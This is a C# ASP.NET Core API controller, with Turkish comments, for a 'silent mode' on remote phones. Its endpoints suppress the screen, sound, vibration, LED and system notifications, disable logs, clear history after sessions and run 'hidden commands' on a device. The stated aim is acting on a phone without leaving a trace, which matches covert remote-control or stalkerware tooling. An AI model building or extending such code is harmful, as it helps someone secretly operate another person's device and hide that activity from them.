using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using PhoneHub.API.DTOs.SilentMode;
using PhoneHub.API.Services;
using System.Security.Claims;

namespace PhoneHub.API.Controllers;

/// <summary>
/// Gizli Mod API Endpointleri
/// Telefonda izleme kaydı bırakmadan işlem yapmak için kullanılır
/// </summary>
[Authorize]
[ApiController]
[Route("api/[controller]")]
public class SilentModeController : ControllerBase
{
    private readonly ISilentModeService _silentModeService;
    private readonly ILogger<SilentModeController> _logger;

    public SilentModeController(ISilentModeService silentModeService, ILogger<SilentModeController> logger)
    {
        _silentModeService = silentModeService;
        _logger = logger;
    }

    /// <summary>
    /// Gizli mod durumunu kontrol et
    /// </summary>
    [HttpGet("status/{deviceId}")]
    public async Task<ActionResult<SilentModeStatusResponse>> GetStatus(Guid deviceId)
    {
        try
        {
            var settings = await _silentModeService.GetSilentModeSettingsAsync(deviceId);
            if (settings == null)
                return NotFound(new { message = "Gizli mod ayarları bulunamadı" });

            return Ok(new SilentModeStatusResponse
            {
                DeviceId = settings.DeviceId,
                IsEnabled = settings.IsEnabled,
                KeepDisplayOff = settings.KeepDisplayOff,
                MuteAudio = settings.MuteAudio,
                DisableVibration = settings.DisableVibration,
                DisableNotificationLED = settings.DisableNotificationLED,
                HideSystemNotifications = settings.HideSystemNotifications,
                DisableLogs = settings.DisableLogs,
                ClearHistoryAfterSession = settings.ClearHistoryAfterSession,
                EnabledAt = settings.EnabledAt
            });
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Gizli mod durumu alınırken hata oluştu");
            return StatusCode(500, new { message = "Bir hata oluştu", error = ex.Message });
        }
    }

    /// <summary>
    /// Gizli modu etkinleştir
    /// </summary>
    [HttpPost("enable/{deviceId}")]
    public async Task<ActionResult<SilentModeStatusResponse>> EnableSilentMode(Guid deviceId, [FromBody] EnableSilentModeRequest request)
    {
        try
        {
            var userId = Guid.Parse(User.FindFirst(ClaimTypes.NameIdentifier)?.Value ?? Guid.Empty.ToString());

            var settings = new Dictionary<string, object>
            {
                { "keepDisplayOff", request.KeepDisplayOff },
                { "muteAudio", request.MuteAudio },
                { "disableVibration", request.DisableVibration },
                { "disableNotificationLED", request.DisableNotificationLED },
                { "hideSystemNotifications", request.HideSystemNotifications },
                { "disableLogs", request.DisableLogs },
                { "clearHistoryAfterSession", request.ClearHistoryAfterSession }
            };

            var result = await _silentModeService.EnableSilentModeAsync(deviceId, userId, settings, request.PIN);

            return Ok(new SilentModeStatusResponse
            {
                DeviceId = result.DeviceId,
                IsEnabled = result.IsEnabled,
                KeepDisplayOff = result.KeepDisplayOff,
                MuteAudio = result.MuteAudio,
                DisableVibration = result.DisableVibration,
                DisableNotificationLED = result.DisableNotificationLED,
                HideSystemNotifications = result.HideSystemNotifications,
                DisableLogs = result.DisableLogs,
                ClearHistoryAfterSession = result.ClearHistoryAfterSession,
                EnabledAt = result.EnabledAt
            });
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Gizli mod etkinleştirilirken hata oluştu");
            return StatusCode(500, new { message = "Bir hata oluştu", error = ex.Message });
        }
    }

    /// <summary>
    /// Gizli modu devre dışı bırak
    /// </summary>
    [HttpPost("disable/{deviceId}")]
    public async Task<ActionResult<object>> DisableSilentMode(Guid deviceId, [FromQuery] string? pin = null)
    {
        try
        {
            var result = await _silentModeService.DisableSilentModeAsync(deviceId, pin);
            if (!result)
                return NotFound(new { message = "Gizli mod ayarları bulunamadı" });

            return Ok(new { message = "Gizli mod devre dışı bırakıldı" });
        }
        catch (UnauthorizedAccessException ex)
        {
            return Unauthorized(new { message = ex.Message });
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Gizli mod devre dışı bırakılırken hata oluştu");
            return StatusCode(500, new { message = "Bir hata oluştu", error = ex.Message });
        }
    }

    /// <summary>
    /// Gizli oturum başlat
    /// </summary>
    [HttpPost("session/start/{deviceId}")]
    public async Task<ActionResult<SilentModeSessionResponse>> StartSession(Guid deviceId)
    {
        try
        {
            var userId = Guid.Parse(User.FindFirst(ClaimTypes.NameIdentifier)?.Value ?? Guid.Empty.ToString());
            var ipAddress = HttpContext.Connection.RemoteIpAddress?.ToString();

            var session = await _silentModeService.StartSilentSessionAsync(deviceId, userId, ipAddress);

            return Ok(new SilentModeSessionResponse
            {
                SessionId = session.Id,
                DeviceId = session.DeviceId,
                StartedAt = session.StartedAt,
                EndedAt = session.EndedAt,
                OperationCount = session.OperationCount,
                Operations = session.Operations,
                IPAddress = session.IPAddress,
                Duration = session.EndedAt.HasValue ? session.EndedAt.Value - session.StartedAt : TimeSpan.Zero
            });
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Gizli oturum başlatılırken hata oluştu");
            return StatusCode(500, new { message = "Bir hata oluştu", error = ex.Message });
        }
    }

    /// <summary>
    /// Gizli oturum bitir
    /// </summary>
    [HttpPost("session/end/{sessionId}")]
    public async Task<ActionResult<SilentModeSessionResponse>> EndSession(Guid sessionId)
    {
        try
        {
            var session = await _silentModeService.EndSilentSessionAsync(sessionId);
            if (session == null)
                return NotFound(new { message = "Oturum bulunamadı" });

            return Ok(new SilentModeSessionResponse
            {
                SessionId = session.Id,
                DeviceId = session.DeviceId,
                StartedAt = session.StartedAt,
                EndedAt = session.EndedAt,
                OperationCount = session.OperationCount,
                Operations = session.Operations,
                IPAddress = session.IPAddress,
                Duration = session.EndedAt.HasValue ? session.EndedAt.Value - session.StartedAt : TimeSpan.Zero
            });
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Gizli oturum sonlandırılırken hata oluştu");
            return StatusCode(500, new { message = "Bir hata oluştu", error = ex.Message });
        }
    }

    /// <summary>
    /// Gizli komut yürüt
    /// </summary>
    [HttpPost("command/execute/{deviceId}/{sessionId}")]
    public async Task<ActionResult<object>> ExecuteHiddenCommand(Guid deviceId, Guid sessionId, [FromBody] HiddenCommandRequest request)
    {
        try
        {
            var command = await _silentModeService.ExecuteHiddenCommandAsync(
                deviceId, sessionId, request.CommandType, request.Parameters, request.PIN);

            return Ok(new
            {
                commandId = command.Id,
                commandType = command.CommandType,
                isExecuted = command.IsExecuted,
                createdAt = command.CreatedAt
            });
        }
        catch (UnauthorizedAccessException ex)
        {
            return Unauthorized(new { message = ex.Message });
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Gizli komut yürütülürken hata oluştu");
            return StatusCode(500, new { message = "Bir hata oluştu", error = ex.Message });
        }
    }

    /// <summary>
    /// Oturumun komutlarını listele
    /// </summary>
    [HttpGet("session/{sessionId}/commands")]
    public async Task<ActionResult<List<object>>> GetSessionCommands(Guid sessionId)
    {
        try
        {
            var commands = await _silentModeService.GetSessionCommandsAsync(sessionId);
            
            var result = commands.Select(c => new
            {
                commandId = c.Id,
                commandType = c.CommandType,
                parameters = c.Parameters,
                isExecuted = c.IsExecuted,
                executedAt = c.ExecutedAt,
                createdAt = c.CreatedAt
            }).ToList();

            return Ok(result);
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Oturum komutları alınırken hata oluştu");
            return StatusCode(500, new { message = "Bir hata oluştu", error = ex.Message });
        }
    }

    /// <summary>
    /// Cihazın gizli oturumlarını listele
    /// </summary>
    [HttpGet("device/{deviceId}/sessions")]
    public async Task<ActionResult<List<SilentModeSessionResponse>>> GetDeviceSessions(Guid deviceId, [FromQuery] int limit = 50)
    {
        try
        {
            var sessions = await _silentModeService.GetDeviceSilentSessionsAsync(deviceId, limit);
            
            var result = sessions.Select(s => new SilentModeSessionResponse
            {
                SessionId = s.Id,
                DeviceId = s.DeviceId,
                StartedAt = s.StartedAt,
                EndedAt = s.EndedAt,
                OperationCount = s.OperationCount,
                Operations = s.Operations,
                IPAddress = s.IPAddress,
                Duration = s.EndedAt.HasValue ? s.EndedAt.Value - s.StartedAt : TimeSpan.Zero
            }).ToList();

            return Ok(result);
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Cihaz oturumları alınırken hata oluştu");
            return StatusCode(500, new { message = "Bir hata oluştu", error = ex.Message });
        }
    }
}
